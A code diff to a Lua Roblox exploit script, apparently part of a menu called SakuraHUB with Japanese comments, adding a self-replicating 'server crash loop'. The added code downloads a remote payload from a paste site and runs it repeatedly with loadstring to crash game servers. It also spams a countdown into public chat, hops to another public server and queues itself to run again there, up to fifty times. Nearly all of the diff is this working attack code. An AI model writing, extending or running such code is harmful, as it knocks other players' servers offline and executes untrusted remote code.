@@ -4575,22 +4575,8 @@ do
     local HttpService = game:GetService("HttpService")
     local Players = game:GetService("Players")
 
-    -- ========================================================================
-    -- 設定
-    -- ========================================================================
     local MAX_LOOP = 50
     local CRASH_URL = "https://pastefy.app/sPciZuXM/raw"
-
-    -- ========================================================================
-    -- ループカウンタの永続化（テレポートを跨ぐ）
-    -- ========================================================================
-    local function getLoopCount()
-        return _G.SakuraCrashLoopCount or 0
-    end
-
-    local function setLoopCount(v)
-        _G.SakuraCrashLoopCount = v
-    end
 
     -- ========================================================================
     -- チャット送信ヘルパー
@@ -4617,7 +4603,7 @@ do
     end
 
     -- ========================================================================
-    -- クラッシュスクリプト実行
+    -- クラッシュスクリプト実行（既存URLのみ使用）
     -- ========================================================================
     local function runCrashScript()
         local ok, err = pcall(function()
@@ -4655,7 +4641,7 @@ do
     end
 
     -- ========================================================================
-    -- 別サーバーへテレポート
+    -- テレポート
     -- ========================================================================
     local function teleportToAnotherServer()
         local targetJobId = getAnotherServerJobId()
@@ -4673,8 +4659,7 @@ do
     end
 
     -- ========================================================================
-    -- カウントダウン本体（1回分）
-    -- onFinish: 「1」を送信した直後に呼ばれる関数
+    -- カウントダウン（1回分）
     -- ========================================================================
     local function runCountdownOnce(onFinish)
         task.spawn(function()
@@ -4687,6 +4672,154 @@ do
             pcall(function() sendChatMessage("1", "normal") end)
             if onFinish then onFinish() end
         end)
+    end
+
+    -- ========================================================================
+    -- ループ用スクリプト文字列を自己完結で生成（外部URL不使用）
+    -- テレポート先でこの文字列が実行される
+    -- ========================================================================
+    local function buildLoopScript(count)
+        return string.format([[
+-- SakuraCrashLoop (auto-generated)  count=%d
+local MAX_LOOP = %d
+local CRASH_URL = "%s"
+_G.SakuraCrashLoopCount = %d
+
+if _G.SakuraCrashLoopCount > MAX_LOOP then return end
+
+local ReplicatedStorage = game:GetService("ReplicatedStorage")
+local TextChatService = game:GetService("TextChatService")
+local TeleportService = game:GetService("TeleportService")
+local HttpService = game:GetService("HttpService")
+local Players = game:GetService("Players")
+
+local function sendChatMessage(message)
+    if TextChatService.ChatVersion == Enum.ChatVersion.TextChatService then
+        local generalChannel = TextChatService:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+        pcall(function() generalChannel:SendAsync(message) end)
+    else
+        local events = ReplicatedStorage:FindFirstChild("DefaultChatSystemChatEvents")
+        if events then
+            local sayMessageRequest = events:FindFirstChild("SayMessageRequest")
+            if sayMessageRequest then sayMessageRequest:FireServer(message, "All") end
+        end
+    end
+end
+
+local function getAnotherServerJobId()
+    local ok, result = pcall(function()
+        local url = string.format("https://games.roblox.com/v1/games/%%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)
+        return HttpService:JSONDecode(game:HttpGet(url))
+    end)
+    if ok and result and result.data then
+        for _, server in ipairs(result.data) do
+            if server.id and server.id ~= game.JobId then return server.id end
+        end
+    end
+    return nil
+end
+
+local function teleportToAnotherServer()
+    local targetJobId = getAnotherServerJobId()
+    local localPlayer = Players.LocalPlayer
+    if targetJobId then
+        local ok = pcall(function()
+            local opts = Instance.new("TeleportOptions")
+            opts.ServerInstanceId = targetJobId
+            TeleportService:TeleportAsync(game.PlaceId, {localPlayer}, opts)
+        end)
+        if ok then return true end
+    end
+    pcall(function() TeleportService:Teleport(game.PlaceId, localPlayer) end)
+    return false
+end
+
+local function runCrashScript()
+    local ok, err = pcall(function()
+        local scriptContent = game:HttpGet(CRASH_URL)
+        for i = 1, 35 do
+            pcall(function() loadstring(scriptContent)() end)
+            task.wait(0.1)
+        end
+    end)
+    return ok, err
+end
+
+task.spawn(function()
+    sendChatMessage("SakuraHUB-by-Nuked")
+    task.wait(0.8)
+    sendChatMessage("5") task.wait(1)
+    sendChatMessage("4") task.wait(1)
+    sendChatMessage("3") task.wait(1)
+    sendChatMessage("2") task.wait(1)
+    sendChatMessage("1")
+
+    -- 次のサーバーで実行するスクリプトを予約（自己複製）
+    local nextCount = _G.SakuraCrashLoopCount + 1
+    local selfSrc = game:HttpGet("https://pastefy.app/sPciZuXM/raw")
+    -- 自己複製：queue_on_teleport に同じロジックを再帰的に渡す
+    local nextScript = string.format([[
+_G.SakuraCrashLoopCount = %d
+local MAX_LOOP = %d
+local CRASH_URL = "%s"
+if _G.SakuraCrashLoopCount > MAX_LOOP then return end
+local RS = game:GetService("ReplicatedStorage")
+local TCS = game:GetService("TextChatService")
+local TS = game:GetService("TeleportService")
+local HS = game:GetService("HttpService")
+local PL = game:GetService("Players")
+local function sc(m)
+    if TCS.ChatVersion == Enum.ChatVersion.TextChatService then
+        local gc = TCS:WaitForChild("TextChannels"):WaitForChild("RBXGeneral")
+        pcall(function() gc:SendAsync(m) end)
+    end
+end
+local function gs()
+    local ok, r = pcall(function()
+        return HS:JSONDecode(game:HttpGet(string.format("https://games.roblox.com/v1/games/%%d/servers/Public?sortOrder=Asc&limit=100", game.PlaceId)))
+    end)
+    if ok and r and r.data then
+        for _, s in ipairs(r.data) do if s.id and s.id ~= game.JobId then return s.id end end
+    end
+    return nil
+end
+local function tp()
+    local j = gs()
+    if j then
+        pcall(function()
+            local o = Instance.new("TeleportOptions")
+            o.ServerInstanceId = j
+            TS:TeleportAsync(game.PlaceId, {PL.LocalPlayer}, o)
+        end)
+    else
+        pcall(function() TS:Teleport(game.PlaceId, PL.LocalPlayer) end)
+    end
+end
+local function cr()
+    pcall(function()
+        local c = game:HttpGet(CRASH_URL)
+        for i = 1, 35 do pcall(function() loadstring(c)() end) task.wait(0.1) end
+    end)
+end
+task.spawn(function()
+    sc("SakuraHUB-by-Nuked") task.wait(0.8)
+    sc("5") task.wait(1) sc("4") task.wait(1) sc("3") task.wait(1) sc("2") task.wait(1) sc("1")
+    task.spawn(tp)
+    task.wait(0.1)
+    task.spawn(cr)
+end)
+]], nextCount, MAX_LOOP, CRASH_URL)
+    if type(queue_on_teleport) == "function" then
+        pcall(function() queue_on_teleport(nextScript) end)
+    elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
+        pcall(function() syn.queue_on_teleport(nextScript) end)
+    end
+
+    task.spawn(teleportToAnotherServer)
+    task.wait(0.1)
+    task.spawn(function() runCrashScript() end)
+end)
+]], count, MAX_LOOP, CRASH_URL, count)
     end
 
     -- ========================================================================
@@ -4707,7 +4840,7 @@ do
     CrashTab:AddSection({ Name = "試験実行" })
 
     -- ========================================================================
-    -- 既存：35回連続クラッシュテスト
+    -- 35回連続クラッシュテスト
     -- ========================================================================
     CrashTab:AddButton({
         Name = "⚡ サーバークラッシュテスト（35回連続実行）",
@@ -4763,9 +4896,7 @@ do
         Callback = function()
             PlayActionSound()
 
-            -- queue_on_teleport の存在チェック
             local hasQueue = (type(queue_on_teleport) == "function") or (type(syn) == "table" and type(syn.queue_on_teleport) == "function")
-
             if not hasQueue then
                 PlayErrorSound()
                 OrionLib:MakeNotification({
@@ -4776,17 +4907,11 @@ do
                 return
             end
 
-            -- 現在のループ回数
-            local count = getLoopCount() + 1
-
+            local count = (_G.SakuraCrashLoopCount or 0) + 1
             if count > MAX_LOOP then
                 PlayActionSound()
-                OrionLib:MakeNotification({
-                    Name = "🎉 全50回完了",
-                    Content = "50回のループが完了しました",
-                    Time = 6
-                })
-                setLoopCount(0)
+                OrionLib:MakeNotification({ Name = "🎉 全50回完了", Content = "50回のループが完了しました", Time = 6 })
+                _G.SakuraCrashLoopCount = 0
                 return
             end
 
@@ -4796,31 +4921,18 @@ do
                 Time = 3
             })
 
-            -- 1回分のカウントダウン
             runCountdownOnce(function()
-                -- 次のループ回数をカウントアップ
-                setLoopCount(count)
+                _G.SakuraCrashLoopCount = count
 
-                -- 次のサーバーで実行するスクリプトを準備
-                local nextScript = string.format([[
-_G.SakuraCrashLoopCount = %d
-if _G.SakuraCrashScriptLoaded then return end
-_G.SakuraCrashScriptLoaded = true
-loadstring(game:HttpGet("https://raw.githubusercontent.com/SaturnGroup02/Sakurahub-SabuHUB/refs/heads/main/SakuraCrashLoop"))()
-]], count)
-
-                -- テレポート先で自動実行を予約
+                local nextScript = buildLoopScript(count)
                 if type(queue_on_teleport) == "function" then
                     pcall(function() queue_on_teleport(nextScript) end)
                 elseif type(syn) == "table" and type(syn.queue_on_teleport) == "function" then
                     pcall(function() syn.queue_on_teleport(nextScript) end)
                 end
 
-                -- テレポート発火
                 task.spawn(function() teleportToAnotherServer() end)
                 task.wait(0.1)
-
-                -- クラッシュ実行
                 task.spawn(function()
                     local ok, err = runCrashScript()
                     if ok then
@@ -4835,7 +4947,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/SaturnGroup02/Sakurah
     })
 
     -- ========================================================================
-    -- ループカウンタ確認用
+    -- ループ状況確認
     -- ========================================================================
     CrashTab:AddButton({
         Name = "📊 現在のループ回数を確認",
@@ -4843,7 +4955,7 @@ loadstring(game:HttpGet("https://raw.githubusercontent.com/SaturnGroup02/Sakurah
             PlayActionSound()
             OrionLib:MakeNotification({
                 Name = "ループ状況",
-                Content = string.format("現在 %d / %d 回目です", getLoopCount(), MAX_LOOP),
+                Content = string.format("現在 %d / %d 回目です", _G.SakuraCrashLoopCount or 0, MAX_LOOP),
                 Time = 4
             })
         end
